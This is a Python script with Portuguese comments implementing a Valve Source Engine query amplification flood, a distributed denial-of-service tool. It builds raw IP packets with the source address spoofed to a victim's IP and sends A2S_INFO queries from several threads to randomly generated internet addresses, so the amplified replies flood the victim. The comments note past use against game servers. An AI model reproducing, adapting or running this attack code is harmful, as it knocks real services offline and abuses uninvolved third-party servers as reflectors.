#!/usr/bin/env python3
"""
VSE (Valve Source Engine) Query Flood.
Explora servidores de jogos (Source engine) enviando queries A2S_INFO.
O servidor responde com pacotes muito maiores que a query (~50x amplificação).

Usado originalmente contra servidores Minecraft/Steam/Garry's Mod/CS:GO.
"""

import socket
import struct
import random
import time
import threading


# A2S_INFO payload bytes
# \xFF\xFF\xFF\xFF\x54 + Source Engine Query header + \x00
A2S_INFO_PAYLOAD = b'\xff\xff\xff\xff\x54Source Engine Query\x00'


# Servidores públicos conhecidos (não use em produção sem autorização)
GAME_SERVERS = [
    # Servidores de teste públicos (autorizados para teste)
    # Substitua por servidores alvo no pentest
]


def _build_vse_query() -> bytes:
    """Constrói uma query A2S_INFO para Source Engine."""
    # Header: 0xFFFFFFFF (4 bytes) + 0x54 (T) + payload + \x00
    header = b'\xff\xff\xff\xff'
    query_type = b'\x54'  # 'T' - A2S_INFO
    # Payload com desafio (alguns servidores exigem)
    challenge = struct.pack('!i', random.randint(0, 0x7FFFFFFF))
    
    return header + query_type + challenge + b'\x00'


def vse_attack(target_ip: str, target_port: int = 27015, duration: int = 60,
               stop_event: threading.Event = None, threads: int = 4):
    """
    VSE (Valve Source Engine) amplification attack.
    
    Envia queries A2S_INFO para servidores Source Engine com origem spoofada.
    O servidor responde com um pacote ~50x maior que a query.
    
    Args:
        target_ip: IP do alvo (será spoofado)
        target_port: Porta do servidor (default 27015 para Source Engine)
        duration: Duração em segundos
        stop_event: Evento para parar
        threads: Número de threads
    """
    
    if stop_event is None:
        stop_event = threading.Event()
    
    def flood_worker(worker_id):
        try:
            # Raw socket para spoofing
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            using_raw = True
        except PermissionError:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            using_raw = False
        
        end_time = time.time() + duration
        
        # Lista de servidores alvo (Source Engine)
        # Em cenário real, você escaneia a internet por servidores abertos
        # Aqui usamos servidores pré-definidos ou varredura de subredes
        
        # Gera IPs aleatórios como alvos para amplificação
        target_servers = []
        for _ in range(50):
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            target_servers.append((ip, target_port))
        
        while time.time() < end_time:
            if stop_event.is_set():
                break
            
            # Escolhe um servidor aleatório
            server_ip, server_port = random.choice(target_servers)
            
            query = _build_vse_query()
            
            try:
                if using_raw:
                    # IP spoofing: origem = target_ip
                    ip_ver_ihl = (4 << 4) + 5
                    ip_tot_len = 20 + 8 + len(query)
                    ip_id = random.randint(1, 65535)
                    ip_src = socket.inet_aton(target_ip)  # SPOOFED
                    ip_dst = socket.inet_aton(server_ip)
                    
                    udp_src = random.randint(1024, 65535)
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ver_ihl, 0, ip_tot_len, ip_id,
                        0, 64, socket.IPPROTO_UDP, 0,
                        ip_src, ip_dst
                    )
                    
                    udp_header = struct.pack('!HHHH',
                        udp_src, server_port, 8 + len(query), 0
                    )
                    
                    packet = ip_header + udp_header + query
                    sock.sendto(packet, (server_ip, 0))
                else:
                    # Sem spoofing
                    sock.sendto(query, (server_ip, server_port))
            except:
                pass
        
        sock.close()
    
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
        t.start()
        workers.append(t)
    
    for t in workers:
        t.join()


if __name__ == '__main__':
    print("[*] Testando VSE flood por 5 segundos...")
    stop = threading.Event()
    t = threading.Thread(target=vse_attack, args=('127.0.0.1', 27015, 5, stop))
    t.start()
    time.sleep(5)
    stop.set()
    print("[*] Teste finalizado.")
